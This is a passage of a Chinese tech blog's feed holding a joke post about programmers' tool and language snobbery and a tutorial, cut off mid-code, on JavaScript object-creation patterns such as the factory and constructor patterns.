      <category term="docker" scheme="http://blog.yfgeek.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>程序员鄙视链</title>
    <link href="http://blog.yfgeek.com/2016/10/12/%E7%A8%8B%E5%BA%8F%E5%91%98%E9%84%99%E8%A7%86%E9%93%BE/"/>
    <id>http://blog.yfgeek.com/2016/10/12/程序员鄙视链/</id>
    <published>2016-10-12T14:07:48.000Z</published>
    <updated>2016-11-19T12:08:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>纯粹的一些梗，比较搞笑。来源知乎和其他网站。<br><a id="more"></a> </p>
<h1 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h1><p>Emacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad</p>
<h1 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h1><p>asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all</p>
<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>Unix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br><em>BSD ↔ System</em><br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian<em> → Redhat</em><br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all</p>
<h1 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h1><p>Emacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0</p>
<h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p><img src="/content/images/chain/1.jpg" alt=""></p>
<p><img src="/content/images/chain/2.jpg" alt=""></p>
<p><img src="/content/images/chain/3.jpg" alt=""></p>
<p><img src="/content/images/chain/4.jpg" alt=""></p>
<p><img src="/content/images/chain/5.jpg" alt=""></p>
<p><strong> 工具篇 </strong><br><img src="/content/images/chain/6.jpg" alt=""></p>
<p><img src="/content/images/chain/7.jpg" alt=""></p>
<p><img src="/content/images/chain/8.jpg" alt=""></p>
<p><img src="/content/images/chain/9.jpg" alt=""></p>
<p><strong> 系统软件篇 </strong></p>
<p><img src="/content/images/chain/10.jpg" alt=""></p>
<p><img src="/content/images/chain/11.jpg" alt=""></p>
<p><img src="/content/images/chain/12.jpg" alt=""></p>
<p><img src="/content/images/chain/13.jpg" alt=""></p>
<p><strong> 职场篇 </strong></p>
<p><img src="/content/images/chain/14.jpg" alt=""></p>
<p><img src="/content/images/chain/15.jpg" alt=""></p>
<p><img src="/content/images/chain/16.jpg" alt=""></p>
<p><img src="/content/images/chain/17.jpg" alt=""></p>
<blockquote>
<p>转载自：<a href="https://www.zhihu.com/question/24270600" target="_blank" rel="external">https://www.zhihu.com/question/24270600</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;纯粹的一些梗，比较搞笑。来源知乎和其他网站。&lt;br&gt;
    
    </summary>
    
      <category term="笑话" scheme="http://blog.yfgeek.com/categories/%E7%AC%91%E8%AF%9D/"/>
    
    
      <category term="笑话" scheme="http://blog.yfgeek.com/tags/%E7%AC%91%E8%AF%9D/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript创建对象的七种模式</title>
    <link href="http://blog.yfgeek.com/2016/10/11/JavaScript%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%B8%83%E7%A7%8D%E6%A8%A1%E5%BC%8F/"/>
    <id>http://blog.yfgeek.com/2016/10/11/JavaScript创建对象的七种模式/</id>
    <published>2016-10-11T12:16:14.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style="color: rgb(0, 128, 255);">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style="color: rgb(0, 128, 255);">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(0, 0, 136);">var</span> person = <span class="" style="color: rgb(0, 0, 136);">new</span> <span class="" style="color: rgb(102, 0, 102);">Object</span>();、</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">person.name = <span class="" style="font-size: 12px; color: rgb(0, 136, 0);">“liubei”</span>;</span></code></p><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">person.age = <span class="" style="font-size: 12px; color: rgb(0, 102, 102);">29</span>;<br>person.job = <span class="" style="font-size: 12px; color: rgb(0, 136, 0);">“shayemuyou”</span>;<br><br>person.sayName = <span class="" style="font-size: 12px; color: rgb(0, 0, 136);">function</span><span class="" style="font-size: 12px; color: rgb(102, 0, 102);">()</span>{<br> &nbsp; &nbsp;<br>&nbsp; alert(<span class="" style="font-size: 12px; color: rgb(0, 0, 136);">this</span>.name);<br>}</span></code></pre><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style="color: rgb(0, 128, 255);">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style="color: rgb(0, 128, 255);">sayName()</span>方法用于显示name属性，<span style="color: rgb(0, 128, 255);">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(0, 0, 136);">var</span> person = {<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class="" style="color: rgb(0, 136, 0);">“liubei”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class="" style="color: rgb(0, 102, 102);">29</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class="" style="color: rgb(0, 136, 0);">“shayemuyou”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class="" style="color: rgb(0, 0, 136);">function</span><span class="" style="color: rgb(102, 0, 102);">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class="" style="color: rgb(0, 0, 136);">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style="color: rgb(0, 128, 255);">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style="color: rgb(0, 128, 255);">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"><br></span></p><p style="line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(247, 92, 47); font-size: 14px;"><strong><span style="color: rgb(247, 92, 47);">一、工厂模式</span></strong></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"><br></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(247, 92, 47);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style="color: rgb(136, 136, 136);">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class="" name="code" style=" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="box-sizing: border-box;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">function</span> <span class="" style="box-sizing: border-box;">createPerson</span><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">(name, age, job)</span>{</span><br> <br><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">&nbsp; var</span> o = <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">new</span> <span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class="" style="box-sizing: border-box;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">function</span><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">return</span> o;<br>}<br><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">var</span> person1 = createPerson(<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“wei”</span>,<span class="" style="color: rgb(0, 102, 102); box-sizing: border-box;">25</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“software”</span>);<br><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">var</span> person2 = createPerson(<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“bu”</span>,<span class="" style="color: rgb(0, 102, 102); box-sizing: border-box;">25</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“software”</span>);</span></code></pre><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style="color: rgb(0, 128, 255);">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style="color: rgb(0, 128, 255);">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"><br></span></p><p style="line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(247, 92, 47);"><strong>二、构造函数模式</strong></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><br></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(0, 0, 136);">function</span> Person<span class="" style="color: rgb(102, 0, 102);">(name, age, job)</span>{<span class="" style="color: rgb(0, 0, 136);"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class="" style="color: rgb(0, 0, 136);"> &nbsp; &nbsp;this</span>.age = age;<br><span class="" style="color: rgb(0, 0, 136);"> &nbsp; &nbsp;this</span>.job = job;<br><span class="" style="color: rgb(0, 0, 136);"> &nbsp; &nbsp;this</span>.sayName = <span class="" style="color: rgb(0, 0, 136);">function</span><span class="" style="color: rgb(102, 0, 102);">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class="" style="color: rgb(0, 0, 136);">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class="" style="color: rgb(0, 0, 136);">var</span> person1 = <span class="" style="color: rgb(0, 0, 136);">new</span> Person(<span class="" style="color: rgb(0, 136, 0);">“wei”</span>,<span class="" style="color: rgb(0, 102, 102);">25</span>,<span class="" style="color: rgb(0, 136, 0);">“software”</span>);<br><span class="" style="color: rgb(0, 0, 136);">var</span> person2 = <span class="" style="color: rgb(0, 0, 136);">new</span> Person(<span class="" style="color: rgb(0, 136, 0);">“bu”</span>,<span class="" style="color: rgb(0, 102, 102);">25</span>,<span class="" style="color: rgb(0, 136, 0);">“software”</span>);</span></code></pre><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style="color: rgb(0, 128, 255);">Person()</span>函数取代了<span style="color: rgb(0, 128, 255);">createPerson()</span>函数，我们注意到<span style="color: rgb(0, 128, 255);">Person()</span>与<span style="color: rgb(0, 128, 255);">createPerson()</span>的不同之处在于：</span></p><ul class="list-paddingleft-2"><li><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">没有显式的创建对象</span></p></li><li><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">直接将属性和方法赋值给this对象</span></p></li><li><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">没有return语句&nbsp;</span></p></section></li></ul><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style="color: rgb(247, 92, 47);"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style="color: rgb(0, 128, 255);">Person</span>实例，必须使用<span style="color: rgb(0, 128, 255);">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style="color: rgb(0, 128, 255);">person1</span>和<span style="color: rgb(0, 128, 255);">person2</span>分别保存着<span style="color: rgb(0, 128, 255);">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">console.<span class="" style="color: rgb(0, 0, 136);">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class="" style="color: rgb(136, 0, 0);">//true</span></span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">console.<span class="" style="font-size: 14px; color: rgb(0, 0, 136);">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class="" style="font-size: 14px; color: rgb(136, 0, 0);">//true</span></span></code></p></pre></section><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style="color: rgb(0, 128, 255);">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style="color: rgb(0, 128, 255);">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style="color: rgb(0, 128, 255);">Object</span>对象的实例，也是<span style="color: rgb(0, 128, 255);">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(102, 0, 102);">console</span>.log(person1 <span class="" style="color: rgb(0, 0, 136);">instanceof</span> Object); &nbsp; &nbsp; <span class="" style="color: rgb(0, 136, 0);">//</span><span class="" style="color: rgb(0, 102, 102);">true</span></span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(102, 0, 102);">console</span>.log(person1 <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">instanceof</span> Person); &nbsp; &nbsp; <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">//</span><span class="" style="font-size: 14px; color: rgb(0, 102, 102);">true</span></span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(102, 0, 102);">console</span>.log(person2 <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">instanceof</span> Object); &nbsp; &nbsp; <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">//</span><span class="" style="font-size: 14px; color: rgb(0, 102, 102);">true</span></span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(102, 0, 102);">console</span>.log(person2 <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">instanceof</span> Person); &nbsp; &nbsp; <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">//</span><span class="" style="font-size: 14px; color: rgb(0, 102, 102);">true</span></span></code></p></pre></section><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style="color: rgb(0, 128, 255);">person1</span>和<span style="color: rgb(0, 128, 255);">person2</span>之所以同是<span style="color: rgb(0, 128, 255);">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style="color: rgb(0, 128, 255);">person1</span>和<span style="color: rgb(0, 128, 255);">person2</span>都有一个名为<span style="color: rgb(0, 128, 255);">sayName()</span>的方法，但是两个方法不是同一<span style="color: rgb(0, 128, 255);">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(0, 0, 136);">function</span> Person<span class="" style="color: rgb(102, 0, 102);">(name, age, job)</span>{</span></code><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;<span class="" style="font-size: 14px; color: rgb(0, 0, 136);">this</span>.name = name; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">new</span> <span class="" style="font-size: 14px; color: rgb(102, 0, 102);">Function</span>(<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“alert(this.name);”</span>) &nbsp; </span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(136, 0, 0);">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style="color: rgb(0, 128, 255);">Person</span>实例都会包含一个不同的<span style="color: rgb(0, 128, 255);">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style="color: rgb(0, 128, 255);">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">alert(person1<span class="" style="color: rgb(68, 68, 68);">.sayName</span> == person2<span class="" style="color: rgb(68, 68, 68);">.sayName</span>)<span class="" style="color: rgb(136, 0, 0);">; &nbsp;//false</span></span></code></pre><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style="color: rgb(0, 128, 255);">Function</span>实例的确没有必要；况且有<span style="color: rgb(0, 128, 255);">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(0, 0, 136);">function</span> Person<span class="" style="color: rgb(102, 0, 102);">(name, age, job)</span>{</span></code><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;<span class="" style="font-size: 14px; color: rgb(0, 0, 136);">this</span>.name = name; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 